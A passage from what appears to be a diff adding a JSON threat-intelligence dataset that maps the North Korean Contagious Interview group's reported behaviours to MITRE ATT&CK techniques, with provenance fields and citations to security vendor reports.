+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Securonix Threat Research, D.Iuzvyk, T. Peck, O.Kolesnikov. (2024, April 24). Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers Likely Associated With North Korean Threat Actors. Retrieved October 20, 2025.",
+          "source_name": "Securonix Contagious Interview DEVPOPPER April 2024",
+          "url": "https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/"
+        },
+        {
+          "citation": "Steve Cobb. (2024, October 29). The Job Offer That Wasn’t: How We Stopped an Espionage Plot. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview FamousChollima October 2024",
+          "url": "https://securityscorecard.com/blog/the-job-offer-that-wasnt-how-we-stopped-an-espionage-plot/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684.001",
+        "name": "Social Engineering: Impersonation",
+        "parent_id": "T1684",
+        "url": "https://attack.mitre.org/techniques/T1684/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has convinced victims to disable Docker and other container environments and run code on their machine natively in attempts to bypass container isolation and ensure device infection.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--4e7b9e53-2cd3-47c0-b08a-b5ed52a20df7",
+        "relationship_modified": "2026-07-31T18:47:54.564Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1685",
+        "name": "Disable or Modify Tools",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1685"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has leveraged malware variants configured to dump credentials from the macOS keychain.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--07d5e168-372a-493e-abb2-904c55b9fe3b",
+        "relationship_modified": "2026-07-31T18:47:54.210Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1555.001",
+        "name": "Credentials from Password Stores: Keychain",
+        "parent_id": "T1555",
+        "url": "https://attack.mitre.org/techniques/T1555/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has configured malicious webpages to identify the victim’s operating system by reviewing the details of the victims User-Agent of their browser.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--bf35d6f4-4ea1-4d4d-bb02-b5d4f6b9f0eb",
+        "relationship_modified": "2026-07-31T18:47:54.824Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1082"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has conducted key word searches within files and directories on a compromised hosts to identify files for exfiltration.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--0c53d506-c557-43be-99e2-04a907341c8a",
+        "relationship_modified": "2026-07-31T18:47:54.262Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1083",
+        "name": "File and Directory Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1083"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has utilized email notifications from malware distribution servers to track victim engagement.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--ba639658-3ca7-4694-aa05-056a6c1c4757",
+        "relationship_modified": "2026-09-03T19:46:50.052Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1071.003",
+        "name": "Application Layer Protocol: Mail Protocols",
+        "parent_id": "T1071",
+        "url": "https://attack.mitre.org/techniques/T1071/003"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has leveraged Astrill VPN for C2.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--acde21f1-6ece-44c6-89b4-aee4a6cf0ae1",
+        "relationship_modified": "2026-09-08T20:28:08.742Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1090",
+        "name": "Proxy",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1090"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has downloaded remote management and monitoring software such as “AnyDesk” for post compromise activities.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--147c6a91-6bf4-458f-94ba-bdb950ecd3bb",
+        "relationship_modified": "2026-07-31T18:47:54.396Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1219.002",
+        "name": "Remote Access Tools: Remote Desktop Software",
+        "parent_id": "T1219",
+        "url": "https://attack.mitre.org/techniques/T1219/002"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has used TCP port 1224 for C2.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--0d44a3cb-f0f1-4b8a-a39d-536783735e8c",
+        "relationship_modified": "2026-09-03T19:46:53.286Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1571",
+        "name": "Non-Standard Port",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1571"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has encrypted C2 traffic using RC4.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--ae459f2c-926a-4e11-b9ab-8b174ed47081",
+        "relationship_modified": "2026-09-02T20:07:47.432Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1573.001",
+        "name": "Encrypted Channel: Symmetric Cryptography",
+        "parent_id": "T1573",
+        "url": "https://attack.mitre.org/techniques/T1573/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has exfiltrated data from a compromised host to actor-controlled C2 servers.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--77f7e0de-b717-49ce-9941-5189bf4b60f5",
+        "relationship_modified": "2026-09-03T19:46:59.508Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0010",
+          "name": "Exfiltration",
+          "order": 13,
+          "shortname": "exfiltration",
+          "url": "https://attack.mitre.org/tactics/TA0010"
+        }
+      ],
+      "technique": {
+        "id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1041"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has exfiltrated victim information using FTP.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--5bb4954e-9e07-48c8-8733-2fee8625a723",
+        "relationship_modified": "2026-09-03T19:46:49.757Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0010",
+          "name": "Exfiltration",
+          "order": 13,
+          "shortname": "exfiltration",
+          "url": "https://attack.mitre.org/tactics/TA0010"
+        }
+      ],
+      "technique": {
+        "id": "T1048.003",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
+        "parent_id": "T1048",
+        "url": "https://attack.mitre.org/techniques/T1048/003"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has leveraged Telegram API to exfiltrate stolen data.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--1c4cff83-25a4-4c36-bc35-dfc5308f2b15",
+        "relationship_modified": "2026-07-31T18:47:54.475Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0010",
+          "name": "Exfiltration",
+          "order": 13,
+          "shortname": "exfiltration",
+          "url": "https://attack.mitre.org/tactics/TA0010"
+        }
+      ],
+      "technique": {
+        "id": "T1567",
+        "name": "Exfiltration Over Web Service",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1567"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has exfiltrated stolen passwords to Dropbox.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--92b459af-5f75-4a9c-97ef-2a0be520caff",
+        "relationship_modified": "2026-07-31T18:47:54.695Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0010",
+          "name": "Exfiltration",
+          "order": 13,
+          "shortname": "exfiltration",
+          "url": "https://attack.mitre.org/tactics/TA0010"
+        }
+      ],
+      "technique": {
+        "id": "T1567.002",
+        "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+        "parent_id": "T1567",
+        "url": "https://attack.mitre.org/techniques/T1567/002"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has stolen cryptocurrency wallet credentials and credit card information utilizing BeaverTail and InvisibleFerret malware.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--56f9acfe-7278-4043-8a47-de7cb12ae515",
+        "relationship_modified": "2026-07-31T18:47:54.592Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0074",
+      "confidence": "low",
+      "description": "“The advisory says its primary targets were web designers, engineers and specialists in cryptocurrency, blockchain and web3.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Japan Dismantles First North Korean Laptop Farm as US and Allies Detail Wider Scheme",
+          "url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1589",
+        "name": "Gather Victim Identity Information",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1589"
+      }
+    },
+    {
+      "attack_ref": "INC-0074",
+      "confidence": "medium",
+      "description": "“The advisory also states that WaterPlum actors and North Korean IT workers have been seen using the same IP addresses, including when accessing laptop farms and applying for jobs.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Japan Dismantles First North Korean Laptop Farm as US and Allies Detail Wider Scheme",
